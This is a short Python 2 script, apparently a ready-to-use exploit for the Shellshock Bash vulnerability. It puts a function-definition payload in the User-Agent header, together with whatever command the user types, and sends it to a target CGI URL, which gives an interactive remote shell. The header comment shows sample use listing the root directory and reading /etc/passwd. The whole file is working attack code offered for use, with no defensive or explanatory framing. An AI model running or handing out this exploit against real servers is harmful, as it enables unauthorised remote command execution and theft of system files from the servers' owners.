#!/usr/bin/python

# Successful Output:
# # python shell_shocker.py <VulnURL>
# [+] Attempting Shell_Shock - Make sure to type full path
# ~$ /bin/ls /
# bin
# boot
# dev
# etc
# ..
# ~$ /bin/cat /etc/passwd

import sys, urllib2

if len(sys.argv) != 2:
        print "Usage: shell_shocker <URL>"
        sys.exit(0)

URL=sys.argv[1]
print "[+] Attempting Shell_Shock - Make sure to type full path"

while True:
        command=raw_input("~$ ")
        opener=urllib2.build_opener()
        opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ; '+command)]
        try:
                response=opener.open(URL)
                for line in response.readlines():
                        print line.strip()
        except Exception as e: print e

